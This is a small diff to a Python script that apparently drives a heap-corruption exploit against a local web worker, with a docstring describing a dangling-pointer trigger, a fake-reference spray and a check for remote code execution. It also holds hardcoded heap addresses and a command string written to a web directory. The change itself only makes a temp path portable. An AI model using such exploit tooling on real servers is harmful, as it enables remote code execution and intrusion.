@@ -3,13 +3,14 @@
 For each S: restart worker, A2 (cheap-oom dangling), build ht@S, B2 (fake-ref spray),
 check /www/p1 for RCE. S = HEAPBASE + off.
 """
+import os
 import subprocess, time, sys, urllib.request
 
 PORT = "18111"
 HEAPBASE = 0x7a7507800000
 ZIF = 0x7a7509b338a0
 CMD = "id>/www/p1"
-GH = r"C:\Users\likat\.qwen\tmp\p2s"
+GH = os.path.join(os.path.expanduser("~"), ".qwen", "tmp", "p2s")
 PY = sys.executable
 
 def sh(cmd):
